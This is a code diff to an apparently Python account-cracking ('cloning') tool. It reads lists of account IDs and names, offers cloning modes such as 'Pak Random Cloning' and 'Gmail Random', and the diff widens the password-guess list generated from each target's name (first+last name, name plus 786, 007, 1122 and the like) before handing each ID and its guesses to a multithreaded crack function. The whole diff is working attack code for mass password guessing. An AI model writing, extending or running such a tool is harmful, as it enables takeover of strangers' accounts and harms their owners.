@@ -174,7 +174,7 @@ def File():
 			clear()
 			print(logo)
 			try:
-				fileX = input ('\n [+] FILE NAME : ') 
+				fileX = input ('\n [+] Put File Path : ') 
 				for line in open(fileX, 'r').readlines():
 					id.append(line.strip())
 				setting()
@@ -215,7 +215,7 @@ def setting():
 	passmenu()
 def passmenu():
 	clear()
-	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
+	print(logo);print  ('\n [01] Auto Password \n [02] All Name Password \n [03] All Name+ password')
 	passmen=input('\n [#] Select Pass : ')
 	if passmen in ['1','01']:
 		first()
@@ -233,20 +233,33 @@ def first():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
+			ls = nmf.split(' ')[1]
 			pwv = ['445566']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
 				else:
-					pwv.append(frs+'123')
+					pwv.append(frs+ls)
+					pwv.append(frs+' '+ls)
 					pwv.append(frs+'12345')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'786')
+					pwv.append(frs+'12')
+					pwv.append(frs+'007')
+					pwv.append(frs+'1234')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
-					pwv.append(frs+'123')
+					pwv.append(frs+ls)
+					pwv.append(frs+' '+ls)
 					pwv.append(frs+'12345')
+					pwv.append(frs+'1122')
+					pwv.append(frs+'786')
+					pwv.append(frs+'12')
+					pwv.append(frs+'007')
+					pwv.append(frs+'1234')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
 			elif 'free' in method:
@@ -428,8 +441,7 @@ class Main:
 		print(" \033[1;32m[1]\033[0;92m File Cloning ")
 		print(" \033[1;32m[2] Public Cloning")
 		print(" \33[1;32m[3] Pak Random Cloning")
-		print(" \033[1;32m[4] 2004 To 2010 ")
-		print(" \33[1;32m[5] 2010 To 2015 ")
+		print(" \033[1;32m[4] Gmail Random ")
 		print("\033[1;32m [E] Exit \n")
 		UZAIR =input(" \033[1;32mCHOOSE : ")
 		if UZAIR in ["1", "01"]:
